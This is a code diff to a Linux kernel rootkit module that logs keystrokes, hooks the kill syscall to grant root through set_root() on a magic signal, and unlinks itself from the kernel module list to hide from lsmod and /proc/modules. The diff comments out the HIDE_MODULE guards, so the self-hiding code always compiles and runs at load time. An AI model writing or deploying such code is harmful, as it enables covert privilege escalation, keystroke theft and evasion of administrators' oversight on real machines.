@@ -15,13 +15,13 @@
 #include <linux/debugfs.h>
 #include <linux/kmod.h>
 
-#ifdef HIDE_MODULE
+// #ifdef HIDE_MODULE
 #include <linux/list.h>
 #include <linux/kobject.h>
 static struct list_head *prev_module;
 static struct kobject *prev_kobj;
 static short hidden = 0;
-#endif
+// #endif
 
 MODULE_DESCRIPTION("");
 MODULE_AUTHOR("");
@@ -49,7 +49,7 @@ static struct file_operations fops = { .read = kl_device_read };
 
 static unsigned long * __force_order;
 
-#ifdef HIDE_MODULE
+// #ifdef HIDE_MODULE
 /* Add this LKM back to the loaded module list, at the point
  * specified by prev_module */
 void showme(void)
@@ -72,7 +72,7 @@ void hideme(void)
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 }
-#endif
+// #endif
 
 #define PREFIX "keylog"
 
@@ -335,11 +335,11 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
             #endif
 			set_root();
 			return 0;
-        #ifdef HIDE_MODULE
+        // #ifdef HIDE_MODULE
         case 90:
             if (hidden == 0) {hideme();}
             else {showme();}
-        #endif
+        // #endif
 		default:
 			return orig_kill(regs);
 	}
@@ -517,11 +517,11 @@ asmlinkage int hook_kill(pid_t pid, int sig)
             #endif
 			set_root();
 			return 0;
-        #ifdef HIDE_MODULE
+        // #ifdef HIDE_MODULE
         case 90:
             if (hidden == 0) {hideme();}
             else {showme();}
-        #endif
+        // #endif
 		default:
 			return orig_kill(regs);
 	}
@@ -662,10 +662,10 @@ static int __init kl_init(void)
 
 	memset(input_buf, 0, BUFLEN);
 
-#ifdef HIDE_MODULE
+// #ifdef HIDE_MODULE
 	/* Hide myself from lsmod and /proc/modules :) */
 	hideme();
-#endif
+// #endif
 
 	return 0;
 }
